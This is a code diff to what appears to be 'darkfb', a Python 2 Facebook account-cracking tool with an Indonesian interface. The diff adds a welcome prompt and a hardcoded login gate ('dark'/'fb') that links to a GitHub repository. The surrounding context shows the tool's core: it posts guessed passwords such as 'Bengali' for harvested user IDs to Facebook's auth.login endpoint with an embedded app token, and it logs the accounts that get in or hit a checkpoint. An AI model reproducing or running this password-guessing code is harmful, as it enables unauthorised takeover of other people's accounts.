@@ -65,6 +65,70 @@ listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
+def siapa():
+	os.system('clear')
+	nama = raw_input("\033[1;97mSiapa nama kamu ? \033[1;91m: \033[1;92m")
+	if nama =="":
+		print"\033[1;96m[!] \033[1;91mIsi yang benar"
+		time.sleep(1)
+		siapa()
+	os.system('clear')
+	jalan("\033[1;97mSelamat datang \033[1;92m" +nama)
+	time.sleep(2)
+	loginSC()
+		
+def loginSC():
+	os.system('clear')
+	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
+	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
+	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
+	if username =="dark" and password =="fb":
+		print"\033[1;96m[✓] \033[1;92mLogin success"
+		time.sleep(1)
+		login()
+	else:
+		print"\033[1;96m[!] \033[1;91mSalah!!"
+		time.sleep(1)
+		Y_T()
+
+def Y_T():
+	hee = raw_input("\n\033[1;97mLihat username dan password (y/t) \033[1;91m: \033[1;92m")
+	if hee =="":
+		print"\033[1;96m[!] \033[1;91mIsi yang benar"
+		time.sleep(1)
+		os.system('clear')
+		Y_T()
+	elif hee =="y":
+		os.system('clear')
+		jalan("\033[1;97mSedang membuka browser")
+		os.system('clear')
+		os.system('xdg-open https://github.com/unikers71/darkfb')
+		time.sleep(1)
+		print"Silahkan lihat username dan password di github"
+		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]\033[1;92m")
+		os.system('clear')
+		loginSC()
+	elif hee =="t":
+		os.system('clear')
+		loginSC()
+	elif hee =="Y":
+		os.system('clear')
+		jalan("\033[1;97mSedang membuka browser")
+		os.system('clear')
+		os.system('xdg-open https://github.com/unikers71/darkfb')
+		time.sleep(1)
+		print"Silahkan lihat username dan password di github"
+		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]\033[1;92m")
+		os.system('clear')
+		loginSC()
+	elif hee =="T":
+		os.system('clear')
+		loginSC()
+	else:
+		print"\033[1;96m[!] \033[1;91mIsi yang benar"
+		time.sleep(1)
+		os.system('clear')
+		Y_T()
 
 def login():
 	os.system('clear')
@@ -543,8 +607,6 @@ def pilih_super():
 																															cek.close()
 																															cekpoint.append(user+pass14)
 																														else:
-																															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-																															b = json.loads(a.text)
 																															pass15 = 'Bengali'
 																															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																															q = json.load(data)
@@ -1000,4 +1062,4 @@ def clone_dari_file():
        
 		
 if __name__ == '__main__':
-	login()
+	siapa()
